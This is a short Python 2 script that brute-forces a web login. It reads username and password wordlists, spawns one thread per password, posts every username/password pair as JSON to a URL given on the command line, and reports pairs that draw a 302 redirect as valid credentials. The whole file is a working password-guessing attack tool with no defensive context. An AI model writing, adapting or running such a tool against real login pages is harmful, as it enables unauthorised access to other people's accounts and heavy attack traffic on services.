import requests
import threading
import time
import sys

threads = []

def burp_corp(url, names, pwd):
	for name in names:
		payload = {'username':name.replace('\n',''), 'password':pwd.replace('\n', ''), 'remember':'true'}
		req = requests.post(url = url, json = payload, allow_redirects=False)
		if req.status_code == 302:
			print 'ok','username',name.replace('\n',''), 'password',pwd.replace('\n', '')

def load_thread(url, namefile, pwdfile):
	namef = open(namefile, 'r')
	pwdf = open(pwdfile, 'r')
	names = namef.readlines()
	pwds = pwdf.readlines()
	t_range = range(0, len(pwdf.readlines()))

	for pwd in pwds:
		t = threading.Thread(target = burp_corp, args=( url, names, pwd))
		threads.append(t)

	for thread in threads:
		thread.start()
	for thread in threads:
		thread.join()

if __name__ == '__main__':
	time_start=time.time();
	url = sys.argv[1]
	namefile = sys.argv[2]
	pwdfile = sys.argv[3]
	#print url, namefile, pwdfile
	load_thread(url, namefile, pwdfile)
	print 'finish'
	time_end=time.time()
	print 'use time:', time_end-time_start, 's'